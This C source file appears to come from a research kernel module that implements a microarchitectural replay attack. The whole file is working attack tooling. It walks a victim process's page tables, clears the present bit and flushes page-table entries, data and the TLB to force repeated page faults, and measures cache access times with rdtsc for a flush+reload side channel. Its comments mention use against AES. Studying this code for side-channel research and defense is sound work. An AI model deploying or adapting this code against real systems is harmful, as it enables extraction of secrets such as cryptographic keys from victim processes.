/*
 * Author: Dimitrios Skarlatos
 * Contact: skarlat2@illinois.edu - http://skarlat2.web.engr.illinois.edu/
 *
 * util.c contains the implementation of all the required utility functions
 * to perform the replay attack. Description of functions are in util.h
 * The functions include:
 * 1) tracking page tables of a requested virtual address
 * 2) perform the nuke which completly flushes all
 * the page table entries and data from the caches for a specified address.
 * 3) create kernel level mapping to process level memory
 * 4) perform a flush+reload side channel
 * 5) other utility functions used for the attack
 */

#include <asm/apic.h>
#include <asm/cache.h>
#include <asm/cacheflush.h>
#include <asm/io.h>
#include <asm/mmu_context.h>
#include <asm/pgalloc.h>
#include <asm/pgtable.h>
#include <asm/tlb.h>
#include <asm/tlbflush.h>
#include <asm/uaccess.h>
#include <asm/uv/uv.h>
#include <linux/device.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/hrtimer.h>
#include <linux/hugetlb.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/ktime.h>
#include <linux/memcontrol.h>
#include <linux/mm.h>
#include <linux/mman.h>
#include <linux/mmu_notifier.h>
#include <linux/module.h>
#include <linux/pagemap.h>
#include <linux/pid.h>
#include <linux/rmap.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/swap.h>
#include <linux/swapops.h>
#include <linux/syscalls.h>
#include <linux/timer.h>

#include "util.h"

MODULE_LICENSE("GPL v2");

/*
 * do_page_walk finds and stores the address of the page table entry
 * for the nuke address. The physical address is returned.
 * See: https://stackoverflow.com/a/41096185/5192980
 * @info is the attack_info that the address will stored
 * @ptlp is the splinlock to be used to lock the page tables with
 */
uint64_t do_page_walk(struct mm_struct *mm, uint64_t address, pte_t **ptepp, spinlock_t **ptlp)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	uint64_t paddr;

	pgd = pgd_offset(mm, address);
	if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd))) {
		pr_info("do_page_walk: pgd_offset failed");
		goto out;
	}

	pud = pud_offset(pgd, address);
	if (pud_none(*pud) || unlikely(pud_bad(*pud))) {
		pr_info("do_page_walk: pud_offset failed");
		goto out;
	}

	pmd = pmd_offset(pud, address);
	VM_BUG_ON(pmd_trans_huge(*pmd)); // We do not handle huge pages for now
	if (pmd_none(*pmd) || unlikely(pmd_bad(*pmd))) {
		pr_info("do_page_walk: pmd_offset failed");
		goto out;
	}

	*ptepp = pte_offset_map_lock(mm, pmd, address, ptlp);
	if (!(*ptepp)) {
		pr_info("do_page_walk: pte_offset failed");
		goto unlock;
	}

	if (!pte_present(**ptepp)) {
		pr_info("do_page_walk: page is not present, aborting.");
		goto out;
	}

	paddr = pte_pfn(**ptepp);
	pte_unmap_unlock(*ptepp, *ptlp);

	return paddr;
unlock:
	pte_unmap_unlock(*ptepp, *ptlp);
out:
	return -EINVAL;
}

/*
 * setup_nuke_structs configures the attack info struct with the information
 * of the address to be nuked.
 * @info ptr to the attack info struct
 * @addr is the VA to be nuked
 */
void setup_nuke_structs(struct attack_info *info, uint64_t address)
{
	spinlock_t *ptlp;

	// Fill the attack info struct with the information about the address, the task and the victim process
	info->nuke_addr = address;
	info->nuke_tsk = current;
	info->nuke_pid = current->pid;
	info->nuke_mm = current->mm;

	// Find and store (in info->nuke_ptep) page table entry of nuke_addr
	do_page_walk(info->nuke_mm, address, &(info->nuke_ptep), &ptlp);
}

/*
 * setup_monitor_structs configures the attack info struct with the information
 * of the address to be monitored.
 * @info ptr to the attack info struct
 * @addr is the VA to be monitored through a side channel
 * @index selects the monitoring addresses location
 */
void setup_monitor_structs(struct attack_info *info, uint64_t address, uint32_t index)
{
	// Fill the attack info struct with the information about the monitor address
	info->monitor_addr[index] = address;
	info->monitor_addr_start[index] = address;
	info->monitors++;
}

/*
 * pf_prep prepares the first page fault by orchestrating the page fault
 * handler and the kernel module. In addition, it flushes the monitor
 * address from the caches.
 * @info ptr to the attack info struct
 * @addr is the VA to page fault (same as nuked)
 * @tot_monitor total monitoring addresses
 */
void pf_prep(struct attack_info *info, uint64_t address, uint32_t tot_monitor)
{
	int ret = 0, i = 0;
	uint64_t old_time = 0, wait_time = 0;
	spinlock_t *ptl;

	// Notify the page fault handler in memory.c about the replay handle pte
	if (info->nuke_ptep) {
		set_attack(info->nuke_ptep, 1);
	} else {
		pr_info("pf_prep: Nuke pte is not mapped, aborting\n");
		return;
	}

	// Perform an initial nuke on the address and prepare a minor page fault
	ret = nuke_lock(info->nuke_mm, address, &ptl, 1);
	if (ret) {
		info->error = 1;
		pr_info("pf_prep: There was an error while performing a nuke, aborting\n");
		return;
	}

	// This is to flush any monitor addresses * before replay 0 *
	// It was commented out in the paper evaluation (AES attack).
	// Note that after replay 0 we can flush these addresses
	// directly in the page fault post_handler.
	for (i = 0; i < tot_monitor; i++) {
		// Flush the monitoring address, using the application native VA
		clflush((uint64_t *)info->monitor_addr[i]);
	}

	// Wait some time for changes to take effect in caches and TLB
	// TODO: why is this necessary?
	while (wait_time < 10000) {
		old_time = rdtsc();
		wait_time += rdtsc() - old_time;
	}
}

/*
 * pf_prep_lockless does the same operations of pf_prep but without 
 * acquiring the lock. This is useful if we need to call pf_prep while
 * in the page fault handler, when we already have the lock.
 */
void pf_prep_lockless(struct attack_info *info, uint64_t address)
{
	int ret = 0;
	uint64_t old_time = 0, wait_time = 0;

	// Notify the page fault handler in memory.c about the replay handle pte
	if (info->nuke_ptep) {
		set_attack(info->nuke_ptep, 1);
	} else {
		pr_info("pf_prep: Nuke pte is not mapped, aborting\n");
		return;
	}

	// Perform a lockless nuke on the address and prepare a minor page fault
	ret = nuke_lockless(info->nuke_mm, address, 1);
	if (ret) {
		info->error = 1;
		return;
	}

	// Wait some time for changes to take effect in caches and TLB
	// TODO: why is this necessary?
	while (wait_time < 10000) {
		old_time = rdtsc();
		wait_time += rdtsc() - old_time;
	}
}

/*
 * cause_long_latency makes the load take a long time by nuking its address
 * (without causing a page fault).
 * This is useful if we need to call pf_prep on the *same address* while in 
 * the page fault handler, when we already have the lock.
 */
void cause_long_latency(struct attack_info *info, uint64_t address)
{
	int ret = 0;
	uint64_t old_time = 0, wait_time = 0;
	spinlock_t *ptl;

	// Perform an initial nuke on the address
	ret = nuke_lock(info->nuke_mm, address, &ptl, 0);
	if (ret) {
		info->error = 1;
		pr_info("cause_long_latency: There was an error while performing a nuke, aborting\n");
		return;
	}

	// Wait some time for changes to take effect in caches and TLB
	// TODO: why is this necessary?
	while (wait_time < 10000) {
		old_time = rdtsc();
		wait_time += rdtsc() - old_time;
	}
}

/*
 * pf_prep_redo does the same operations of pf_prep_lockless but without 
 * notifying the page fault handler in memory.c about the replay handle pte.
 * This is useful if we need to call pf_prep on the *same address* while in 
 * the page fault handler, when we already have the lock.
 */
void pf_redo(struct attack_info *info, uint64_t address)
{
	int ret = 0;
	uint64_t old_time = 0, wait_time = 0;

	// Perform a partial nuke on the address
	ret = nuke_lockless_partial(info->nuke_mm, address, 1);
	if (ret) {
		info->error = 1;
		pr_info("pf_redo: Nuke_lockless_partial error");
		return;
	}

	// Wait some time for changes to take effect in caches and TLB
	// TODO: why is this necessary?
	while (wait_time < 10000) {
		old_time = rdtsc();
		wait_time += rdtsc() - old_time;
	}
}

/*
 * nuke_lock finds the address of the page tables given a 4KB page.
 * The data and all the page table entries are then flushed from the cache.
 * The next time this memory access is performed from the victim process at
 * least five memory access (pgd, pud, pmd, ptep, data) will be performed.
 * If @present is non-zero the present bit of the PTE is also cleared.
 * This way the next access will eventually also cause a page fault.
 * 
 * @mm is the mm_struct of the process
 * @address is the addres we are searching
 * @ptepp a pointer to the pte, this will be set at the end of the search
 * with the pte we nuked
 * @ptlp is the splinlock to be used to lock the page tables with
 * @present if non-zero the Present bit of the pte is cleared
 */
int nuke_lock(struct mm_struct *mm, uint64_t address, spinlock_t **ptlp, int present)
{
	// Find pgd; pud; pmd; pte of nuke_addr
	// See: https://stackoverflow.com/a/41096185/5192980
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *ptep;

	pgd = pgd_offset(mm, address);
	if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd))) {
		pr_info("nuke_lock: pgd_offset failed");
		goto out;
	}

	pud = pud_offset(pgd, address);
	if (pud_none(*pud) || unlikely(pud_bad(*pud))) {
		pr_info("nuke_lock: pud_offset failed");
		goto out;
	}

	pmd = pmd_offset(pud, address);
	VM_BUG_ON(pmd_trans_huge(*pmd)); // We do not handle huge pages for now
	if (pmd_none(*pmd) || unlikely(pmd_bad(*pmd))) {
		pr_info("nuke_lock: pmd_offset failed");
		goto out;
	}

	ptep = pte_offset_map_lock(mm, pmd, address, ptlp);
	if (!ptep) {
		pr_info("nuke_lock: pte_offset failed");
		goto unlock;
	}

	if (!pte_present(*ptep)) {
		pr_info("nuke_lock: page is not present, aborting..");
		goto unlock;
	}

	// Force a minor page fault
	if (present) {
		*ptep = pte_clear_flags(*ptep, _PAGE_PRESENT);
	}

	// Flush the data contained in the address from the cache
	// Clflush works with the virtual address and we're in the
	// context of the victim process now so that address
	// works in the kernel too.
	clflush((void *)address);

	// Flush the page tables
	// TODO: Make sure this is enough to cause a PWC miss too
	clflush(ptep);
	clflush(pmd);
	clflush(pud);
	clflush(pgd);

	// Flush TLB
	__flush_tlb_single(address);

	// Done
	pte_unmap_unlock(ptep, *ptlp);
	return 0;
unlock:
	pte_unmap_unlock(ptep, *ptlp);
out:
	return -EINVAL;
}

/*
 * nuke_lockless does the same things as nuke_lock, but without a lock.
 * This is used when we need to nuke a new address but we are already
 * holding a lock due to page faults (e.g. in the page fault post_handler).
 * For example when switching from replay handle to pivot in the AES attack.
 * 
 * @mm is the mm_struct of the process
 * @address is the addres we are searching
 * @ptepp a pointer to the pte, this will be set at the end of the search
 * with the pte we nuked
 * @ptlp is the splinlock to be used to lock the page tables with
 * @present if non-zero the Present bit of the pte is cleared
 */
int nuke_lockless(struct mm_struct *mm, uint64_t address, int present)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *ptep;

	pgd = pgd_offset(mm, address);
	if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd))) {
		pr_info("nuke_lockless: pgd_offset failed");
		goto out;
	}

	pud = pud_offset(pgd, address);
	if (pud_none(*pud) || unlikely(pud_bad(*pud))) {
		pr_info("nuke_lockless: pud_offset failed");
		goto out;
	}

	pmd = pmd_offset(pud, address);
	VM_BUG_ON(pmd_trans_huge(*pmd));
	if (pmd_none(*pmd) || unlikely(pmd_bad(*pmd))) {
		pr_info("nuke_lockless: pmd_offset failed");
		goto out;
	}

	// currently ignore huge pages
	// if (pmd_huge(*pmd)) {
	//   pr_info("nuke_lockless: huge page found, abort");
	//   goto out;
	// }

	ptep = pte_offset_map(pmd, address);

	if (!ptep) {
		pr_info("nuke_lockless: pte_offset failed");
		goto out;
	}

	if (!pte_present(*ptep)) {
		pr_info("nuke_lock: page is not present, aborting..");
		goto out;
	}

	// force a minor page fault
	if (present) {
		*ptep = pte_clear_flags(*ptep, _PAGE_PRESENT);
	}

	// flush data
	clflush((void *)address);

	// flush page tables
	clflush(ptep);
	clflush(pmd);
	clflush(pud);
	clflush(pgd);

	// flush tlb
	__flush_tlb_single(address);

	return 0;
out:
	return -EINVAL;
}

/*
 * nuke_lockless_partial does the same things as nuke_lockless, but without
 * the need to clear the present bit. That's because this function is used 
 * for additional nukes on the same address which for which we already
 * cleared that bit before. There is no need to re-clear it then because
 * the kernel code that would set it is bypassed in memory.c.
 * The goal of this nuke is just to cause (potentially partial) misses again.
 */
int nuke_lockless_partial(struct mm_struct *mm, uint64_t address, int present)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *ptep;

	pgd = pgd_offset(mm, address);
	if (pgd_none(*pgd) || unlikely(pgd_bad(*pgd))) {
		pr_info("nuke_lockless: pgd_offset failed");
		goto out;
	}

	pud = pud_offset(pgd, address);
	if (pud_none(*pud) || unlikely(pud_bad(*pud))) {
		pr_info("nuke_lockless: pud_offset failed");
		goto out;
	}

	pmd = pmd_offset(pud, address);
	VM_BUG_ON(pmd_trans_huge(*pmd));
	if (pmd_none(*pmd) || unlikely(pmd_bad(*pmd))) {
		pr_info("nuke_lockless: pmd_offset failed");
		goto out;
	}

	// currently ignore huge pages
	// if (pmd_huge(*pmd)) {
	//   pr_info("nuke_lockless: huge page found, abort");
	//   goto out;
	// }

	ptep = pte_offset_map(pmd, address);

	if (!ptep) {
		pr_info("nuke_lockless: pte_offset failed");
		goto out;
	}

	// flush data
	clflush((void *)address);

	// flush page tables
	clflush(ptep);
	clflush(pmd);
	clflush(pud);
	clflush(pgd);

	// flush tlb
	__flush_tlb_single(address);

	return 0;
out:
	return -EINVAL;
}

/*
 * print_info outputs some of the attack_info struct information
 * @info is the attack info struct
 */
void print_info(struct attack_info *info)
{
	int i;
	if (info->nuke_tsk != NULL) {
		pr_info("print_info: Victim task %p\n", info->nuke_tsk);
	} else {
		pr_info("print_info: Victim task is NULL\n");
	}

	if (info->nuke_mm != NULL) {
		pr_info("print_info: Victim mm %p\n", info->nuke_mm);
	} else {
		pr_info("print_info: Victim mm is NULL\n");
	}

	if (info->nuke_pid != 0) {
		pr_info("print_info: Victim pid %d\n", info->nuke_pid);
	} else {
		pr_info("print_info: Victim pid is not set\n");
	}

	if (info->nuke_addr != 0) {
		pr_info("print_info: Victim nuke addr %p\n",
				(uint64_t *)info->nuke_addr);
	} else {
		pr_info("print_info: Victim nuke addr is not set\n");
	}

	for (i = 0; i < info->monitors; i++) {
		if (info->monitor_addr[i] != 0) {
			pr_info("print_info: Victim monitor addr[%d] %p\n", i,
					(uint64_t *)info->monitor_addr[i]);
		} else {
			pr_info("print_info: Victim monitor addr[%d] is not set\n", i);
		}
	}
}

/*
 * asm_cctime measure access time of a specified address
 * through fenced assembly.
 * @addr is the VA to be measured
 */
uint32_t asm_cctime(uint64_t addr)
{
	uint32_t cycles;

	asm volatile("mov %1, %%r8\n\t"
				 "lfence\n\t"
				 "rdtsc\n\t"
				 "mov %%eax, %%edi\n\t"
				 "mov (%%r8), %%r8\n\t"
				 "lfence\n\t"
				 "rdtsc\n\t"
				 "sub %%edi, %%eax\n\t"
				 : "=a"(cycles) /*output*/
				 : "r"(addr)
				 : "r8", "edi");

	return cycles;
}

/*
 * check_side_channel_single performs the reload step of the flush+reload
 * side channel.
 * @address is the address we are measuring its access time
 * @index is used for output purposes only
 */
uint64_t check_side_channel_single(uint64_t address, uint32_t index)
{
	uint64_t access_time = 0;
	access_time = asm_cctime(address);

#ifdef DEBUG
	pr_info("side_channel: Page fault, %u, access time, %llu\n", index, access_time);
#endif

	return access_time;
}
